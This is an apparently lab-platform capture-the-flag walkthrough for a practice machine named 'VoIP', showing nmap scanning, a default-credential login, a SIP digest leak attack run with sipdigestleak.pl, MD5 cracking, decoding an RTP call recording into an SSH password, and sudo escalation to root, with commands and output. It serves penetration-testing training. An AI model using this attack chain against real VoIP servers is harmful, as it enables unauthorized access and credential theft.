@@ -1,0 +1,162 @@
+<div id="__BVID__15___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__15___BV_modal_header_" class="modal-header"><h5 id="__BVID__15___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__15___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-main-color"><!----><div><h1>Exploitation Guide for VoIP</h1>
+<h2>Summary</h2>
+<p>We'll take advantage of weak web application credentials, allowing us to exploit a SIP (<em>Session Initiation Protocol</em>) digest leak vulnerability in a VoIP server. We'll then be able to retrieve and decode a raw RTP (<em>Real-time Transport Protocol</em>) stream, which contains SSH password for a local user. The corresponding username is also leaked from the web app. The user has unrestricted <code>sudo</code> permissions, with which we are granted root access.</p>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<p>We'll begin with an <code>nmap</code> scan.</p>
+<pre id="fence-code-12" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nmap 192.168.120.57
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-19 08:27 EDT
+Nmap scan report for 192.168.120.57
+Host is up (0.029s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8000/tcp open  http-alt
+...
+</code></pre>
+<h3>Port 8000 Enumeration</h3>
+<p>Browsing to the website on port 8000, we discover a login page. Guessing the credentials <code>admin:admin</code>, we'll be able to access the application.</p>
+<p>Visiting the <em>CONFIGURATION</em> tab on the website, we find a VoIP responder config.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_74_image_1_7WUUz2WK.png" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<p>This is configuration information for a VoIP server.</p>
+<pre id="fence-code-13" class="fence-code"><code>...
+&lt;!-- Dynamnic response generator --&gt;
+
+  &lt;recv response="*"&gt;
+  	&lt;action&gt;
+            &lt;ereg regexp=“^[A-Za-z0-9_.]+$" search_in="response" assign_to="status"/&gt;
+            &lt;strcmp assign_to="result" variable="1" value=“status" /&gt;
+            &lt;test assign_to="status" variable="result" compare="equal" value="0.0"/&gt;
+      &lt;/action&gt;
+  &lt;/recv&gt;
+  &lt;send&gt;
+   &lt;![CDATA[
+   		$result
+   ]]&gt;
+  &lt;/send&gt;
+...
+</code></pre>
+<p>In addition, we'll navigate to the <em>INFORMATION</em> tab to obtain a list of potential usernames for further leverage.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_74_image_3_4iAboptQ.png" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<h2>Exploitation</h2>
+<h3>VoIP Config Enumeration</h3>
+<p>SIP digest leak is a SIP phone vulnerability that allows the attacker to get a digest response from a phone and use it to guess the password via a brute-force attack. The VoIP responder on the target has a predefined wildcard <code>&lt;recv response="*"&gt;</code>, allowing us to send <code>407 Proxy Auth Required</code> instead of <code>ACK</code>, triggering the digest leak response.</p>
+<p>The default call scenario usually executes like this:</p>
+<pre id="fence-code-14" class="fence-code"><code>DEFAULT CALL SCENARIO
+
+          Script                                         Phone
+      ---&gt; INVITE                                          ---&gt; 
+      &lt;--- 100 Trying                                      &lt;---
+      &lt;--- 180 Ringing                                     &lt;---
+      &lt;--- 200 OK                                          &lt;---
+      ---&gt; ACK                                             ---&gt;
+      &lt;--- BYE                                             &lt;---
+      ---&gt; ACK                                             ---&gt; 
+</code></pre>
+<h3>SIP Digest Leak Attack</h3>
+<p><a href="https://www.voip-info.org/sipp/" target="_blank">SIPp</a> is a VoIP traffic generator. We can use <em>SIPp</em> to make fake calls to the server, however we'll need to create a custom call scenario to send <code>407 Proxy Auth Required</code> instead of <code>ACK</code> when <code>BYE</code> is received from server.</p>
+<pre id="fence-code-15" class="fence-code"><code>CUSTOM CALL SCENARIO FOR SIP DIGEST LEAK
+
+           Script                                         Phone
+      ---&gt; INVITE                                          ---&gt; 
+      &lt;--- 100 Trying                                      &lt;---
+      &lt;--- 180 Ringing                                     &lt;---
+      &lt;--- 200 OK                                          &lt;---
+      ---&gt; ACK                                             ---&gt;
+      &lt;--- BYE                                             &lt;---
+      ---&gt; 407 Proxy Authentication Required (with digest) ---&gt; 
+      &lt;--- BYE (with digest response)                      &lt;---
+</code></pre>
+<p>The <code>407 Proxy authentication required</code> request indicates that the client must now authenticate itself with the proxy. To exploit SIP digest leak with SIPp, we'll be using the <strong>sipdigestleak.pl</strong> script from <a href="https://github.com/Pepelux/sippts/blob/master/sipdigestleak.pl" target="_blank">GitHub</a>.</p>
+<p>After downloading the script to our attacking machine, we'll run the exploit against the target.</p>
+<pre id="fence-code-16" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ perl sipdigestleak.pl -h 192.168.120.240 
+[+] Connecting to 192.168.120.240:5060
+[+] Sending INVITE 100 =&gt; 100
+[-] 200 OK
+[+] Sending ACK
+[+] Waiting for the BYE message
+[-] BYE received
+[+] Sending 407 Proxy Authentication Required
+[-] Auth: Digest username="adm_sip", uri="sip:127.0.0.1:5060", password="074b62fb6c21b84e6b5846e6bb001f67", algorithm=MD5
+</code></pre>
+<p>We can use <a href="https://crackstation.net/" target="_blank">Crack Station</a> to crack the MD5 hash, giving us the password <code>passion</code>.</p>
+<h3>Port 80 Web Application Enumeration</h3>
+<p>Using the recovered credentials <code>adm_sip:passion</code> to log in on port 80, we'll navigate to the <em>CDR</em> tab athe top, where we find call data records for users. Here we find a raw call recording <em>RTP</em> (Real-time Transport Protocol) file. Since it's in the raw call format, we need the correct encoder to decode this file.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_74_image_2_x32fCGj7.png" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<p>Navigating to the <em>Stream Rates</em> tab on the left, we obtain important information on encoding techniques, frequency (Hz), and bit rates that are used to record and encode calls.</p>
+<pre id="fence-code-17" class="fence-code"><code>Input #0, wav, from 'Call-id':
+Duration: 00:00:00:00, bitrate: 128 kb/s
+
+Stream #0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 8000 Hz, mono, s16, 128 kb/s
+
+Stream mapping:
+Stream #0:0 -&gt; #0:0 (pcm_s16le (native) -&gt; pcm_mulaw (native))
+
+Output #0, rtp, to 'raw': PT=ITU-T G.711 PCMU
+
+
+Metadata:
+encoder : Lavf58.29.100
+Stream #0:0: Audio: pcm_mulaw, 8000 Hz, mono, s16, 64 kb/s
+
+Metadata:
+encoder : Lavc58.54.100 pcm_mulaw
+size= --kB time=00:00:00:00 bitrate=64.8kbits/s speed= 1x 
+</code></pre>
+<p>This information tells us that the raw file is encoded using the <em>G.711</em> encoder <code>pcm_mulaw</code> with the rate of 8000Hz. We can use the tool <code>sox</code> to decode the raw file with the following syntax.</p>
+<pre id="fence-code-18" class="fence-code"><code>sox -t raw -r 8000 -v 4 -c 1 -e mu-law 2138.raw out.wav
+</code></pre>
+<p>Playing and listening to the decoded call stream, we'll hear the following recording.</p>
+<pre id="fence-code-19" class="fence-code"><code>Your Password has been changed to Password1234 where P is capital
+</code></pre>
+<h3>SSH</h3>
+<p>Recalling the list of potential usernames we recovered while enumerating the application on port 8000, we'll next attempt to log in with each user via SSH. We'll finally succeed with <code>voiper:Password1234</code>.</p>
+<pre id="fence-code-20" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ ssh voiper@192.168.120.57
+voiper@127.0.0.1's password:
+...
+voiper@VOIP:~$ whoami
+voiper
+voiper@VOIP:~$
+</code></pre>
+<h2>Escalation</h2>
+<h3>Unrestricted Sudo</h3>
+<p>Since we have this user's password, we'll start by enumerating what sudo privileges the user has.</p>
+<pre id="fence-code-21" class="fence-code"><code>voiper@VOIP:~$ sudo -l
+[sudo] password for voiper: 
+...
+Matching Defaults entries for voiper on VOIP:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User voiper may run the following commands on VOIP:
+    (ALL : ALL) ALL
+</code></pre>
+<p>Nice! Looks like we have unrestricted sudo privileges, allowing us to easily spawn a root shell.</p>
+<pre id="fence-code-22" class="fence-code"><code>voiper@VOIP:~$ sudo su
+root@VOIP:/home/voiper# whoami
+root
+root@VOIP:/home/voiper#
+</code></pre>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
